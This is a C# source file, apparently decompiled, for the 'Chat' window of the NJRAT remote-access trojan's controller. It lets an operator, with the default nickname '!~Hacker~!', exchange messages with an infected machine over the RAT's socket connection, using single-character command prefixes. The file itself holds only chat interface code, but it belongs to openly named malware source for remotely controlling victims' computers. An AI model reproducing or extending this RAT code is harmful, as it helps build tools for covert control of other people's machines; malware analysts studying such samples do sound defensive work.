using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NJRAT.NJRAT;

namespace NJRAT
{
	// Token: 0x0200000E RID: 14
	[DesignerGenerated]
	public partial class Chat : Form
	{
		// Token: 0x06000114 RID: 276 RVA: 0x0014FE54 File Offset: 0x0014E254
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Chat.__ENCList;
			lock (_ENCList)
			{
				bool flag = Chat.__ENCList.Count == Chat.__ENCList.Capacity;
				if (flag)
				{
					int num = 0;
					int num2 = 0;
					int num3 = Chat.__ENCList.Count - 1;
					int num4 = num2;
					for (;;)
					{
						int num5 = num4;
						int num6 = num3;
						if (num5 > num6)
						{
							break;
						}
						WeakReference weakReference = Chat.__ENCList[num4];
						flag = weakReference.IsAlive;
						if (flag)
						{
							bool flag2 = num4 != num;
							if (flag2)
							{
								Chat.__ENCList[num] = Chat.__ENCList[num4];
							}
							num++;
						}
						num4++;
					}
					Chat.__ENCList.RemoveRange(num, Chat.__ENCList.Count - num);
					Chat.__ENCList.Capacity = Chat.__ENCList.Count;
				}
				Chat.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}

		// Token: 0x17000068 RID: 104
		// (get) Token: 0x06000117 RID: 279 RVA: 0x001502B8 File Offset: 0x0014E6B8
		// (set) Token: 0x06000118 RID: 280 RVA: 0x001502D0 File Offset: 0x0014E6D0
		internal virtual TextBox T2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler keyEventHandler = new KeyEventHandler(this.T2_KeyDown);
				bool flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown -= keyEventHandler;
				}
				this._T2 = value;
				flag = this._T2 != null;
				if (flag)
				{
					this._T2.KeyDown += keyEventHandler;
				}
			}
		}

		// Token: 0x17000069 RID: 105
		// (get) Token: 0x06000119 RID: 281 RVA: 0x00150330 File Offset: 0x0014E730
		// (set) Token: 0x0600011A RID: 282 RVA: 0x00150348 File Offset: 0x0014E748
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Button1_Click);
				bool flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click -= eventHandler;
				}
				this._Button1 = value;
				flag = this._Button1 != null;
				if (flag)
				{
					this._Button1.Click += eventHandler;
				}
			}
		}

		// Token: 0x1700006A RID: 106
		// (get) Token: 0x0600011B RID: 283 RVA: 0x001503A8 File Offset: 0x0014E7A8
		// (set) Token: 0x0600011C RID: 284 RVA: 0x001503C0 File Offset: 0x0014E7C0
		internal virtual Timer vmethod_8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._vmethod_8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
				bool flag = this._vmethod_8 != null;
				if (flag)
				{
					this._vmethod_8.Tick -= eventHandler;
				}
				this._vmethod_8 = value;
				flag = this._vmethod_8 != null;
				if (flag)
				{
					this._vmethod_8.Tick += eventHandler;
				}
			}
		}

		// Token: 0x1700006B RID: 107
		// (get) Token: 0x0600011D RID: 285 RVA: 0x00150420 File Offset: 0x0014E820
		// (set) Token: 0x0600011E RID: 286 RVA: 0x00150438 File Offset: 0x0014E838
		internal virtual RichTextBox T1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._T1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._T1 = value;
			}
		}

		// Token: 0x0600011F RID: 287 RVA: 0x00150444 File Offset: 0x0014E844
		public Chat()
		{
			base.FormClosing += this.Chat_FormClosing;
			base.Load += this.Chat_Load;
			Chat.__ENCAddToList(this);
			this.hk = "!~Hacker~!";
			this.InitializeComponent();
		}

		// Token: 0x06000120 RID: 288 RVA: 0x0015049C File Offset: 0x0014E89C
		private void Chat_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool cn = this.sk.CN;
			if (cn)
			{
				this.sk.Send("@");
			}
			this.sk.CN = false;
		}

		// Token: 0x06000121 RID: 289 RVA: 0x001504D8 File Offset: 0x0014E8D8
		private void Chat_Load(object sender, EventArgs e)
		{
			this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.osk.L)));
			this.Show();
			string text = Interaction.InputBox("Enter Your NickName", "Chat", this.hk, -1, -1);
			bool flag = Operators.CompareString(text, string.Empty, false) == 0;
			if (flag)
			{
				this.sk.CN = false;
			}
			else
			{
				this.hk = text;
				this.sk.Send("~" + Class7.string_1 + Class6.smethod_14(ref this.hk));
			}
			this.vmethod_8.Enabled = true;
			this.T2.Select();
			this.T2.Focus();
		}

		// Token: 0x06000122 RID: 290 RVA: 0x0015059C File Offset: 0x0014E99C
		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				e.SuppressKeyPress = true;
				flag = Operators.CompareString(this.T2.Text, string.Empty, false) != 0;
				if (flag)
				{
					lock (this)
					{
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
						this.T1.AppendText(this.hk + " : ");
						this.T1.SelectionFont = this.T1.Font;
						this.T1.AppendText(this.T2.Text + "\r\n");
						this.T1.SelectionStart = this.T1.TextLength;
						this.T1.ScrollToCaret();
						TextBox t = this.T2;
						string text = t.Text;
						t.Text = text;
						this.sk.Send("!" + Class7.string_1 + Class6.smethod_14(ref text));
						this.T2.Text = string.Empty;
					}
				}
			}
			else
			{
				this.T2.Select();
			}
		}

		// Token: 0x06000123 RID: 291 RVA: 0x00150718 File Offset: 0x0014EB18
		private void Button1_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.T2.Text, string.Empty, false) != 0;
			if (flag)
			{
				lock (this)
				{
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.SelectionFont = new Font(this.T1.Font, FontStyle.Bold);
					this.T1.AppendText(this.hk + " : ");
					this.T1.SelectionFont = this.T1.Font;
					this.T1.AppendText(this.T2.Text + "\r\n");
					this.T1.SelectionStart = this.T1.TextLength;
					this.T1.ScrollToCaret();
					TextBox t = this.T2;
					string text = t.Text;
					t.Text = text;
					this.sk.Send("!" + Class7.string_1 + Class6.smethod_14(ref text));
					this.T2.Text = string.Empty;
				}
			}
		}

		// Token: 0x06000124 RID: 292 RVA: 0x0015086C File Offset: 0x0014EC6C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			bool flag = (this.sk == null) | (this.osk == null);
			if (flag)
			{
				bool flag2 = this.T2.Enabled | (Operators.CompareString(this.T1.Text, string.Empty, false) == 0);
				if (flag2)
				{
					this.T1.AppendText("Disconnected ...");
				}
				this.T2.Enabled = false;
				this.Button1.Enabled = false;
				this.sk.Send("@");
				this.sk.CN = false;
				this.Close();
			}
			else
			{
				bool flag2 = !this.sk.CN | !this.osk.CN;
				if (flag2)
				{
					flag = this.T2.Enabled | (Operators.CompareString(this.T1.Text, string.Empty, false) == 0);
					if (flag)
					{
						this.T1.AppendText("Disconnected ...");
					}
					this.T2.Enabled = false;
					this.Button1.Enabled = false;
					this.sk.Send("@");
					this.sk.CN = false;
					this.Close();
				}
			}
		}

		// Token: 0x06000125 RID: 293 RVA: 0x001509AC File Offset: 0x0014EDAC
		private void T1_LinkClicked(object sender, LinkClickedEventArgs e)
		{
			try
			{
				Process.Start(e.LinkText);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x04000082 RID: 130
		private static List<WeakReference> __ENCList = new List<WeakReference>();

		// Token: 0x04000084 RID: 132
		[AccessedThroughProperty("T2")]
		private TextBox _T2;

		// Token: 0x04000085 RID: 133
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x04000086 RID: 134
		[AccessedThroughProperty("vmethod_8")]
		private Timer _vmethod_8;

		// Token: 0x04000087 RID: 135
		[AccessedThroughProperty("T1")]
		private RichTextBox _T1;

		// Token: 0x04000088 RID: 136
		public string hk;

		// Token: 0x04000089 RID: 137
		public Client osk;

		// Token: 0x0400008A RID: 138
		public Client sk;
	}
}
